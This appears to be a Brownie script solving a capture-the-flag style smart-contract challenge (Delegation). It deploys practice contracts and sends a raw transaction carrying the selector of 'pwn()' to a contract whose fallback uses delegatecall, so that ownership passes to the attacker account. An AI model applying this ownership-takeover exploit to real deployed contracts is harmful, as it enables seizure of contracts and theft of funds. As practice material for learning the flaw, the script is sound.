from scripts.helpful_scripts import get_account
from brownie import Delegation, network, Delegate, DelegationAttack
from web3 import Web3
from web3.auto import w3


def deploy_Delegate(_owner):
    owner = get_account(index=1)
    delegate = Delegate.deploy(
        _owner,
        {"from": owner},
    )
    return delegate


def deploy_Delegation(_delegateAddress):
    owner = get_account(index=1)
    delegation = Delegation.deploy(
        _delegateAddress,
        {"from": owner},
    )
    return delegation


def deploy_DelegationAttack(_delegateAddress):
    owner = get_account(index=1)
    delegation_attack = DelegationAttack.deploy(
        _delegateAddress,
        {"from": owner},
    )
    return delegation_attack


def main():
    print(network.show_active())
    account = get_account()
    owner = get_account(index=1)
    delegate = deploy_Delegate(owner)
    delegation = deploy_Delegation(delegate)
    delegation_attack = deploy_DelegationAttack(delegation)
    print(f"Attacker is \t\t {account}")
    print(f"Delegate deployed at \t {delegate}")
    print(f"Delegation deployed at \t {delegation}")
    print(f"Delegation owner is \t {delegation.owner()}")

    # find the keccak hash of "pwn()"
    hash = Web3.keccak(text="pwn()").hex()
    hash = hash[: 8 + 2]  # take the first 4 bytes + "0x"

    # delegation.sendTransaction({"from": account, "data": 0xDD365B8B})
    # Can't find how to do that directly with brownie
    w3.eth.sendTransaction(
        {"to": delegation.address, "from": account.address, "data": hash}
    )

    print(f"Delegation owner is now  {delegation.owner()}")
